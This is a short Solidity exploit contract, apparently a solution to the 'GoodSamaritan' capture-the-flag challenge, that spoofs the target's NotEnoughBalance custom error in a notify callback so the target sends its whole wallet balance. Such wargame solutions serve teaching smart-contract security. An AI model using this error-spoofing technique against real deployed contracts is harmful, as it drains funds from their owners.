// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../lessons/27-GoodSamaritan.sol";

error NotEnoughBalance();

contract GoodSamaritanAttack is INotifyable {
    GoodSamaritan goodSamaritan;

    constructor(address _goodSamaritanAddress) {
        goodSamaritan = GoodSamaritan(_goodSamaritanAddress);
    }

    function attack() public {
        goodSamaritan.requestDonation();
    }

    /**
     * Mimics the NotEnoughBalance() error in GoodSamaritan
     * This causes the contract to send the entire wallet balance
     */
    function notify(uint256 amount) external pure override {
        if (amount == 10) revert NotEnoughBalance();
    }
}
